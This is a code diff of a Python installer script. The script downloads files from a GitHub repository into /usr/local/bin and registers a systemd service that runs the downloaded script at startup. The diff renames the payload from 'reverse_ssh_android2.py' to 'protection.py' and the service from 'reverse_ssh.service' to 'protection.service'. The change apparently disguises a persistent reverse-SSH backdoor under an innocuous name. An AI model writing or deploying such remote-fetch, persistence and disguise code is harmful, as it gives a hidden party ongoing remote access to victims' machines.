@@ -7,7 +7,7 @@ import subprocess
 
 
 # Define URLs for downloading the necessary files
-repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/reverse_ssh_android2.py"
+repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection.py"
 requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
 contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"
 
@@ -15,10 +15,10 @@ contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads
 # Define the output file paths
 envPath = "/usr/local/bin/protectionEnv"
 pythonPath = "/usr/local/bin/protectionEnv/bin/python3"
-repoFilePath = "/usr/local/bin/reverse_ssh_android2.py"
+repoFilePath = "/usr/local/bin/protection.py"
 requirementsFilePath = "/usr/local/bin/requirements.txt"
 contentFilePath = "/usr/local/bin/mechanism"
-serviceFilePath = "/etc/systemd/system/reverse_ssh.service"
+serviceFilePath = "/etc/systemd/system/protection.service"
 
 # Function to download a file and save it locally
 def download_file(url, file_path):
@@ -52,7 +52,7 @@ Description=Secuserver Installer Service
 After=network.target
 
 [Service]
-ExecStart={python_path} /usr/local/bin/reverse_ssh_android2.py
+ExecStart={python_path} /usr/local/bin/protection.py
 WorkingDirectory=/usr/local/bin
 Environment=PATH={os.path.dirname(python_path)}:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 StandardOutput=journal
